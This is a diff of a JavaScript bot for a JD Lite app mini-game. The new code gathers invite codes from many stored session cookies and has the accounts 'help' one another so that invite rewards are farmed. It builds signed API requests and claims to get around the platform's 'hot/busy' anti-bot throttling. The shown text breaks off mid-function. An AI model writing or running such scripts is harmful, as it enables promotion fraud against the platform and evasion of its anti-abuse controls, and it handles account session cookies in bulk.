@@ -1,374 +1,25 @@
 /*
 #
 京东极速App首页-汪汪乐园
-15 6,10,14,19,21 * * * Sami_jd_wwly.js
+17 6,16,20 * * * Sami_jd_wwlyzl.js
 由于程序频繁提交JDAPI，导致游戏出现“火爆”现象,本自用程序已经解决次问题。
  */
-const $ = new Env("Sami汪汪乐园1-20")
-const Ver = '20220616';
+const $ = new Env("Sami汪汪乐园助力")
+const Ver = '20220619';
 const JD_API_HOST = 'https://api.m.jd.com/client.action';
 const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
-let cookiesArr = [], cookie = '';
+let cookiesArr = [], cookie = '',cookie1 = '',sharecookie = '';
 let shareCodes = [];
 !(async () => {
     await $.wait(1000);
-    await VerCheck("wwly",Ver);
+    await VerCheck("wwlyzl",Ver);
     await $.wait(1000);
     requireConfig()
     await $.wait(5000);
-    for (let i = 0; i < cookiesArr.length; i++) {
-        cookie = cookiesArr[i]
-        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
-        $.index = i + 1;
-        $.nickName = '';
-        $.Flag = false;
-        $.UserName1 =encodeURIComponent($.UserName)
-        console.log(`\n账号【${$.index}】${$.UserName} 汪汪乐园2022信息`);
-        if (i>=0 && i<20){
-            let data2 = await getBodySign('startTask',$.UserName1)
-            //console.log(data2)
-            if(data2.code===101){
-                console.log('本时段任务已经完成,请等待下个时段！！！')
-                continue;
-            }
-            
-        }else{
-            console.log('不再执行范围内')
-            continue;
-        }
-        ////////////////////Start:首先查询所有汪汪信息，对于的工位上的汪汪，安排下工位///////////////////////////////////////////////////////////
-        //https://api.m.jd.com/?functionId=joyList&body={%22linkId%22:%22LsQNxL7iWDlXUs6cFl-AAg%22}&t=1652164181116&appid=activities_platform&h5st=20220510142941528%3B6237189232500324%3Be18ed%3Btk02w74971b5418nCO2IGnkJD1EEOaSj2R5iGZbaEzPiBBT3ysEVje9VHW9iP3CgBjoL4LzHdbRszFJW8i7qZ8bcgpH1%3B2d59de7c2f030ee9d8c9e0e735dd3b070e756b0d67b147dbdfa792c79b5dde52%3B3.0%3B1652164181528&cthr=1
-        //获得所有汪汪信息
-        t1 = Date.now();
-        h5st = await GetInfo(`joyList`,t1,`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-        //console.log(encodeURIComponent(h5st))
-        data= await GetTask("joyList",encodeURIComponent(`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`),t1,encodeURIComponent(h5st))
-        //console.log(data)
-        //await $.wait(50000);
-        if(data.code != 0){
-            console.log('该账号的活动异常，请登录手机查看是否正常！！')
-            continue;
-        }
-        for (let vo of  data.data?.workJoyInfoList) {
-            if(vo.joyDTO != null){
-               let joyDTOID= vo.joyDTO.id;
-               let location =vo.location;
-               //console.log("qqqq"+joyDTOID); 
-               //汪汪下工位
-               t2 = Date.now();
-               h5st = await GetInfo(`joyMove`,t2,`{"joyId":`+joyDTOID+`,"location":0,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
-               //console.log(encodeURIComponent(h5st))
-               data= await PostTask("joyMove",`{"joyId":`+joyDTOID+`,"location":0,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
-                //console.log(data)
-                //await $.wait(50000);
-               //console.log(data)
-               //{ success: true, code: 0, errMsg: 'success', data: null }
-               if (data.code === 0){
-                   if (data.errMsg === 'success'){
-                        console.log(`汪汪乐园:工位`+location +` `+joyDTOID+`下工位成功!`);
-                    }else{
-                        console.log(`汪汪乐园:工位`+location +` `+joyDTOID+`下工位失败!`);
-                    }
-               }
-               
-           }else if( vo.unlock == true){
-               let location =vo.location;
-               console.log(`汪汪乐园:工位`+location+`上空空如也!`);
-           }
-        }
-        ////////////////////End:首先查询所有汪汪信息，对于的工位上的汪汪，安排下工位///////////////////////////////////////////////////////////
-        ////////////////////Start:对已经存在的汪汪进行合成///////////////////////////////////////////////////////////
-        $.hcjg = false;
-        for (let i = 0;i < 50; i++){
-            $.hcjg = false;
-            //获得所有汪汪信息
-            //data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-            t1 = Date.now();
-            h5st = await GetInfo(`joyList`,t1,`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-            data= await GetTask("joyList",encodeURIComponent(`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`),t1,encodeURIComponent(h5st))
-            if(data.code != 0){
-                console.log('该账号的活动异常，请登录手机查看是否正常！！')
-                continue;
-            }
-            for (let vo of  data.data?.activityJoyList){
-                let joyDTOID1= vo.id;
-                let joyDTOlevel1= vo.level;
-                //console.log(vo.id + vo.level);
-                for (let vo1 of  data.data?.activityJoyList){
-                    let joyDTOID2= vo1.id;
-                    let joyDTOlevel2= vo1.level;
-                    //判断是否有相同等级的汪汪
-                    if(joyDTOID1 != joyDTOID2 && joyDTOlevel1 == joyDTOlevel2 ){
-                        //开始合成
-                        //MergeGet = await GetInfo(`joyMergeGet`,Date.now(),`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8420176953300815`,`b08cf`,`0`,$.UserName1);
-                        h5st = await GetInfo(`joyMergeGet`,t1,`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8420176953300815`,`b08cf`,`0`,$.UserName1);
-                        MergeGet= await GetTask("joyMergeGet",encodeURIComponent(`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`),t1,encodeURIComponent(h5st))
-                        if(MergeGet.code === 0){
-                            //console.log(':'+ JSON.stringify(MergeGet))
-                            if(MergeGet.errMsg=="success"){
-                                console.log(`汪汪:合成成功!`);
-                                await $.wait(8000);
-                                $.hcjg = true;
-                                break;
-                            }
-                        }
-                        await $.wait(2000);
-                    }
-                }
-                if ($.hcjg == true){
-                    break;
-                }
-                
-            }
-            if( $.hcjg == false){
-               console.log("汪汪乐园:初始化无合成的汪汪!!!")
-               break;
-            }
-            
-            
-        }
-        
-        ////////////////////End:对已经存在的汪汪进行合成///////////////////////////////////////////////////////////
-        ////////////////////Start:开始做汪汪任务///////////////////////////////////////////////////////////
-        data = await GetAllTask();
-        for (let vo of  data.data) {
-            let id=vo.id;
-            let taskTitle=vo.taskTitle;
-            let taskDoTimes=vo.taskDoTimes;
-            console.log('**************************');
-            console.log('开始任务：'+taskTitle);
-            //***************************************************************
-            if (id==264 && (taskDoTimes==0 || taskDoTimes===null)){
-                //console.log(taskTitle);
-                await eveDayChack("apDoTask",id,"SIGN",taskTitle);
-                await $.wait(4000);
-                await eveDayChack("apTaskDrawAward",id,"SIGN",taskTitle);
-            }else if(id==264){
-                console.log('-->'+taskTitle + ':任务已完成');
-            }
-            //***************************************************************        
-            if (id==662 && (taskDoTimes==0 || taskDoTimes===null)){
-                let data = await apDoTask("apDoTask",id,encodeURIComponent(vo.taskSourceUrl),"BROWSE_CHANNEL",taskTitle);
-                //console.log(data)
-                await $.wait(4000);
-                await eveDayChack("apTaskDrawAward",id,"BROWSE_CHANNEL",taskTitle);
-            }else if(id==662){
-                console.log('-->'+taskTitle + ':任务已完成');
-            }
-            //***************************************************************         
-            if (id==810 && (taskDoTimes != 5 || taskDoTimes===null)){
-              //console.log(taskTitle);
-              data = await gsh("apTaskDetail",id,"BROWSE_CHANNEL");
-              //console.log($.dataJson);
-              if (data.success===true){
-                  //taskItemList
-                    for (let vo3 of  data.data.taskItemList) {
-                        let itemId=vo3.itemId;
-                        let itemName=vo3.itemName;
-                        console.log('--------------------------------');
-                        console.log(itemName);
-                        await apDoTask("apDoTask",id,itemId,"BROWSE_CHANNEL",taskTitle);
-                        await $.wait(5000);
-                        await eveDayChack("apTaskDrawAward",id,"BROWSE_CHANNEL",taskTitle);
-                        await $.wait(5000);
-                        
-                    }
-              }
-            }else if(id==481){
-                 console.log('-->'+taskTitle + ':任务已完成');
-            }
-            //***************************************************************         
-            if (id==630 && (taskDoTimes != 5 || taskDoTimes===null)){
-              // console.log(taskTitle);
-              data = await gsh("apTaskDetail",id,"BROWSE_PRODUCT");
-              //console.log($.dataJson);
-              $.vo3=data;
-              if ($.vo3.success===true){
-                  //taskItemList
-                  $.jc=taskDoTimes;
-                    if(taskDoTimes === null){
-                       $.jc = 0;
-                    }
-                    for (let vo3 of  $.vo3.data.taskItemList) {
-                        let itemId=vo3.itemId;
-                        let itemName=vo3.itemName;
-                        console.log('--------------------------------');
-                        console.log(itemName);
-                        
-                        await apDoTask("apDoTask",id,itemId,"BROWSE_PRODUCT",taskTitle);
-                        if (data.success===false){
-                            console.log(`跳入下一个资源`)
-                            if(data.code===2005){
-                              break;
-                            }
-                        }else{
-                            await $.wait(5000);
-                            await eveDayChack("apTaskDrawAward",id,"BROWSE_PRODUCT",taskTitle);
-                            await $.wait(5000);
-                            $.jc=$.jc+1;
-                        }
-                        if($.jc >= 5){
-                                break;
-                            }
-                            if(data.success===false){
-                                break;
-                            }
-                        
-                    }
-              }
-            }else if(id==630){
-                 console.log('-->'+taskTitle + ':任务已完成');
-            }
-                    
-                   
-        }
-        await $.wait(1000); 
-        
-        ////////////////////End:开始做汪汪任务///////////////////////////////////////////////////////////
-        ////////////////////Start:开始购买汪汪并合成///////////////////////////////////////////////////////////
-        $.hcjg = false;
-        for (let i = 0;i < 50; i++){
-            $.hcjg = false;
-            //购买汪汪
-            //data = await GetInfo(`joyBaseInfo`,Date.now(),`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`7149631238350732`,`4abce`,`1`,$.UserName1);
-            t2 = Date.now();
-            h5st = await GetInfo(`joyBaseInfo`,t2,`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
-            //console.log(encodeURIComponent(h5st))
-            data= await PostTask("joyBaseInfo",`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
-            if(data.code===0){
-                if(data.data.level===30){
-                    console.log('汪汪已经成熟啦，赶紧领取！！！');
-                    break;
-                }else{
-                    //***************************************************************开始购买
-                    console.log('---------------------------------');
-                    console.log('汪汪目前等级:'+data.data.level);
-                    console.log('汪汪购买等级:'+data.data.fastBuyLevel);
-                    if (data.data.joyCoin >= data.data.fastBuyCoin){
-                        console.log('钱购买');
-                        //data1 = await GetInfo(`joyBuy`,Date.now(),`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6020245910128165`,`ffb36`,`1`,$.UserName1);
-                        t2 = Date.now();
-                        h5st = await GetInfo(`joyBuy`,t2,`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
-                        //console.log(encodeURIComponent(h5st))
-                        data1= await PostTask("joyBuy",`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
-                        if (data1.code ===0){
-                            console.log('汪汪购买成功:'+data1.data.name);
-                        }else{
-                            console.log('汪汪购买失败,5S后重试');
-                            await $.wait(5000)
-                            //data1 = await GetInfo(`joyBuy`,Date.now(),`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6020245910128165`,`ffb36`,`1`,$.UserName1);
-                            h5st = await GetInfo(`joyBuy`,t2,`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
-                            //console.log(encodeURIComponent(h5st))
-                            data1= await PostTask("joyBuy",`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
-                            if (data1.code ===0){
-                                console.log('汪汪购买成功:'+data1.data.name);
-                            }else{
-                                console.log('汪汪购买失败，程序退出购买');
-                                break;
-                            }
-                            
-                        }
-                    }else{
-                        console.log('汪汪购买失败:没有钱了！！');
-                        break;
-                    }
-                    console.log("购买完成")
-                //***************************************************************购买后合成    
-                    $.hcjg = false;
-                    for (let ii = 0;ii < 50; ii++){
-                        $.hcjg = false;
-                        //获得所有汪汪信息
-                        //data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-                        t1 = Date.now();
-                        h5st = await GetInfo(`joyList`,t1,`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-                        data= await GetTask("joyList",encodeURIComponent(`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`),t1,encodeURIComponent(h5st))
-                        for (let vo of  data.data?.activityJoyList){
-                            let joyDTOID1= vo.id;
-                            let joyDTOlevel1= vo.level;
-                            //console.log(vo.id + vo.level);
-                            for (let vo1 of  data.data?.activityJoyList){
-                                let joyDTOID2= vo1.id;
-                                let joyDTOlevel2= vo1.level;
-                                //判断是否有相同等级的汪汪
-                                if(joyDTOID1 != joyDTOID2 && joyDTOlevel1 == joyDTOlevel2 ){
-                                    //开始合成
-                                    //MergeGet = await GetInfo(`joyMergeGet`,Date.now(),`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8420176953300815`,`b08cf`,`0`,$.UserName1);
-                                    h5st = await GetInfo(`joyMergeGet`,t1,`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8420176953300815`,`b08cf`,`0`,$.UserName1);
-                                    MergeGet= await GetTask("joyMergeGet",encodeURIComponent(`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`),t1,encodeURIComponent(h5st))
-                                    if(MergeGet.code === 0){
-                                        //console.log(JSON.stringify(MergeGet))
-                                        if(MergeGet.errMsg=="success"){
-                                            console.log(`汪汪:合成成功!`);
-                                            await $.wait(8000);
-                                            $.hcjg = true;
-                                            break;
-                                        }
-                                    }
-                                    await $.wait(2000);
-                                }
-                            }
-                            if ($.hcjg == true){
-                                break;
-                            }
-                            
-                        }
-                        if( $.hcjg == false){
-                           console.log("汪汪乐园:无合成的汪汪!!!")
-                           break;
-                        }
-                    }
-                //***************************************************************
-                    
-                }
-            }
-            
-            
-        }
-            
-        ////////////////////End:开始购买汪汪///////////////////////////////////////////////////////////
-        ////////////////////Start:开始上工位///////////////////////////////////////////////////////////
-        t1 = Date.now();
-        h5st = await GetInfo(`joyList`,t1,`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-        data= await GetTask("joyList",encodeURIComponent(`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`),t1,encodeURIComponent(h5st))
-        if(data.code != 0){
-            console.log('该账号的活动异常，请登录手机查看是否正常！！')
-            continue;
-        }
-        data.data.activityJoyList=sortByKey(data.data?.activityJoyList,"level");
-        for (let vo of  data.data?.workJoyInfoList) {
-           if (vo.unlock === true && vo.joyDTO === null){
-               for (let vo1 of  data.data?.activityJoyList) {
-                    let joyDTOID= vo1.id;
-                     //data = await joyMove(joyDTOID,vo.location);
-                    //data = await GetInfo(`joyMove`,Date.now(),`{"joyId":`+joyDTOID+`,"location":`+vo.location+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
-                    t2 = Date.now();
-                   h5st = await GetInfo(`joyMove`,t2,`{"joyId":`+joyDTOID+`,"location":`+vo.location+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
-                   //console.log(encodeURIComponent(h5st))
-                   data= await PostTask("joyMove",`{"joyId":`+joyDTOID+`,"location":`+vo.location+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
-                    //console.log(data);
-                    if(data.code === 0){
-                        console.log(`汪汪:`+vo1.level+`上工位成功!`);
-                        //data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-                        t1 = Date.now();
-                        h5st = await GetInfo(`joyList`,t1,`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
-                        data= await GetTask("joyList",encodeURIComponent(`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`),t1,encodeURIComponent(h5st))
-                        await $.wait(5000);
-                        if(data.code != 0){
-                            console.log('该账号的活动异常，请登录手机查看是否正常！！')
-                            continue;
-                        }
-                        data.data.activityJoyList=sortByKey( data.data.activityJoyList,"level");
-                    }
-                    break;
-                }
-           }
-        }
-        ////////////////////End:开始上工位///////////////////////////////////////////////////////////
-        await getBodySign('endTask',$.UserName1)
-        console.log("OK")
-        await $.wait(50000);
-    }
-    
+    await getHelpCode();
+    await $.wait(5000);
+    await doHelp1();
+
 })()  .catch((e) => {
     $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
   })
@@ -385,45 +36,111 @@ function sortByKey(array, key) {
          var x = a[key]; var y = b[key];
          return ((x > y) ? -1 : ((x < y) ? 1 : 0));
      });
- }
-
-function GetAllTask() {
-    return new Promise(async resolve => {
-        const options = {
-            url: `https://api.m.jd.com/`,
-            body:`functionId=apTaskList&body={"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1644236293058&appid=activities_platform`,
-            headers: {
-                "referer": "https://joypark.jd.com/",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": cookie,
-                "User-Agent": ua
-            }
-        }
-        $.post(options, (err, resp, data) => {
-            try {
-                if (err) {
-                    console.log(`${JSON.stringify(err)}`)
-                    console.log(`${$.name} API请求失败，请检查网路重试`)
-                } else {
-                    if (data) {
-                        data = JSON.parse(data);
-                        //{"success":true,"code":0,"errMsg":null,"data":[{"id":478,"taskTitle":"下单任务","taskType":"ORDER_MARK","taskLimitTimes":5,"taskShowTitle":"下单立赢大量汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"注意：若产生退货等虚假下单行，奖励将收回","awardIconUrl":null,"awardGivenNumber":"75000","grantStandard":0}],"taskDoTimes":0,"taskShowRank":1,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":"https://pro.m.jd.com/jdlite/active/32ESeTAGi8yv2ZNZ8P5irfX1cHEp/index.html"},{"id":264,"taskTitle":"汪汪乐园签到","taskType":"SIGN","taskLimitTimes":1,"taskShowTitle":"每日签到得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"完成可获得大量汪币奖励","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":3,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":null},{"id":481,"taskTitle":"汪汪乐园浏览会场","taskType":"BROWSE_CHANNEL","taskLimitTimes":5,"taskShowTitle":"逛会场得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛会场可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null},{"id":483,"taskTitle":"汪汪乐园浏览商品","taskType":"BROWSE_PRODUCT","taskLimitTimes":5,"taskShowTitle":"逛商品得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛商品可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null}]}
-                        
-                            //$.log(`京豆抽奖: ` + data.promptMsg);
-                    } else {
-                        console.log(`京东服务器返回空数据`)
-                    }
-                }
-            } catch (e) {
-                $.logErr(e, resp)
-            } finally {
-                resolve(data);
-            }
-        })
-    })
 }
 
-//每日签到任务
+async function doHelp1(){
+    for (let i = 0; i < 20; i++) {
+        flag = '0'
+        cookie1 = cookiesArr[i]
+        sharecookie = shareCodes[i]
+        $.UserName = decodeURIComponent(cookie1.match(/pt_pin=([^; ]+)(?=;?)/) && cookie1.match(/pt_pin=([^; ]+)(?=;?)/)[1])
+        $.index1 = i + 1;
+        $.UserName1 =encodeURIComponent($.UserName)
+        console.log(`\n账号【${$.index1}】${$.UserName} 助力信息`);
+        for(let j = 0; j < 5; j++){
+            data = await GetAllTask();
+            for (let vo of  data.data) {
+                let id=vo.id;
+                let taskTitle=vo.taskTitle;
+                let taskDoTimes=vo.taskDoTimes;
+                if (id==610 && (taskDoTimes != 5 || taskDoTimes===null)){
+                    console.log('**************************');
+                    console.log('开始任务：'+taskTitle);
+                    for (let ii = 0; ii < cookiesArr.length; ii++) {
+                        cookie = cookiesArr[ii]
+                        $.UserName2 = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
+                        $.index = ii + 1;
+                        $.UserName3 =encodeURIComponent($.UserName2)
+                        console.log(ii +' '+ $.UserName2 + ' 开始助力 '+$.UserName)
+                        await $.wait(1000);
+                        data = await getHelpSign('getHelpStatus',$.UserName3,'0')
+                        console.log(data)
+                        if(data.success==true){
+                            t2 = Date.now();
+                            h5st = await GetInfo(`joyBaseInfo`,t2,`{"taskId":"610","inviteType":"1","inviterPin":"`+sharecookie+`","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName3);
+                            data= await PostTask("joyBaseInfo",`{"taskId":"610","inviteType":"1","inviterPin":"`+sharecookie+`","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
+                            //console.log(data);
+                            if(data.data?.helpState==0){
+                               //data = await getHelpSign('setHelpStatus',$.UserName1,'1')
+                                console.log('自己不能给自己助力！');
+                            }
+                            if(data.data?.helpState==3){
+                                data1 = await getHelpSign('setHelpStatus',$.UserName3,'1')
+                                console.log('助力次数已经用完或者火爆了！');
+                                //console.log(data1)
+                            }
+                            if(data.data?.helpState==1){
+                                data1 = await getHelpSign('setHelpStatus',$.UserName3,'1')
+                                console.log('助力成功！');
+                                await $.wait(5000);
+                                await eveDayChack("apTaskDrawAward",id,"SHARE_INVITE",taskTitle);
+                                await $.wait(5000);
+                                break;
+                            }
+                            await $.wait(10000);
+                        }else{
+                            console.log('助力次数已经用完！');
+                        }
+                    }
+                    
+                }
+                if (id==610 && taskDoTimes == 5){
+                    flag = '1'
+                }
+            }
+            if (flag == '1'){
+                console.log('任务结果：邀请任务全部完成');
+                break;
+            }
+            
+        }
+    }
+        
+        
+}
+
+
+
+async function getHelpCode(){
+    for (let i = 0; i < cookiesArr.length; i++) {
+        cookie = cookiesArr[i]
+        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
+        $.index = i + 1;
+        $.UserName1 =encodeURIComponent($.UserName)
+        console.log(`\n账号【${$.index}】${$.UserName} 汪汪乐园互助码信息`);
+        data = await getHelpSign('getHelpSign',$.UserName1,'0')
+        //console.log(data)
+        if(data.helpCode=='0'){
+            t2 = Date.now();
+            h5st = await GetInfo(`joyBaseInfo`,t2,`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
+            data= await PostTask("joyBaseInfo",`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
+            //console.log(data.data?.invitePin)
+            if(data.data?.invitePin != undefined){
+                data = await getHelpSign('setHelpSign',$.UserName1,data.data?.invitePin)
+                console.log(`📣📣📣互助码: `+ data.helpCode);
+                shareCodes.push(data.helpCode);
+                await $.wait(5000);
+            }else{
+                 console.log(`📣📣📣互助码: `+  ` 获取失败 `);
+            }
+        }else{
+            console.log(`📣📣📣互助码:`+data.helpCode);
+            shareCodes.push(data.helpCode);
+            //console.log(shareCodes.length)
+        }
+        
+    }
+}
 function eveDayChack(functionId,taskId,taskType,taskTitle) {
     return new Promise(async resolve => {
         const options = {
@@ -432,7 +149,7 @@ function eveDayChack(functionId,taskId,taskType,taskTitle) {
             headers: {
                 "referer": "https://joypark.jd.com/",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": cookie,
+                "Cookie": cookie1,
                 "User-Agent": ua
             }
         }
@@ -464,17 +181,16 @@ function eveDayChack(functionId,taskId,taskType,taskTitle) {
     })
 }
 
-//每日逛商会
-function gsh(functionId,taskId,taskType) {
+
+function GetAllTask() {
     return new Promise(async resolve => {
         const options = {
             url: `https://api.m.jd.com/`,
-            body:`functionId=${functionId}&body={"taskType":"${taskType}","taskId":${taskId},"channel":4,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1644660402980&appid=activities_platform`,
-                   //functionId=apTaskDetail&body={"taskType":"BROWSE_PRODUCT","taskId":483,"channel":4,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1644661811786&appid=activities_platform
+            body:`functionId=apTaskList&body={"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1644236293058&appid=activities_platform`,
             headers: {
                 "referer": "https://joypark.jd.com/",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": cookie,
+                "Cookie": cookie1,
                 "User-Agent": ua
             }
         }
@@ -486,11 +202,9 @@ function gsh(functionId,taskId,taskType) {
                 } else {
                     if (data) {
                         data = JSON.parse(data);
-                       // $.dataJson=data;
+                        //{"success":true,"code":0,"errMsg":null,"data":[{"id":478,"taskTitle":"下单任务","taskType":"ORDER_MARK","taskLimitTimes":5,"taskShowTitle":"下单立赢大量汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"注意：若产生退货等虚假下单行，奖励将收回","awardIconUrl":null,"awardGivenNumber":"75000","grantStandard":0}],"taskDoTimes":0,"taskShowRank":1,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":"https://pro.m.jd.com/jdlite/active/32ESeTAGi8yv2ZNZ8P5irfX1cHEp/index.html"},{"id":264,"taskTitle":"汪汪乐园签到","taskType":"SIGN","taskLimitTimes":1,"taskShowTitle":"每日签到得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"完成可获得大量汪币奖励","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":3,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":null},{"id":481,"taskTitle":"汪汪乐园浏览会场","taskType":"BROWSE_CHANNEL","taskLimitTimes":5,"taskShowTitle":"逛会场得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛会场可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null},{"id":483,"taskTitle":"汪汪乐园浏览商品","taskType":"BROWSE_PRODUCT","taskLimitTimes":5,"taskShowTitle":"逛商品得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛商品可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null}]}
                         
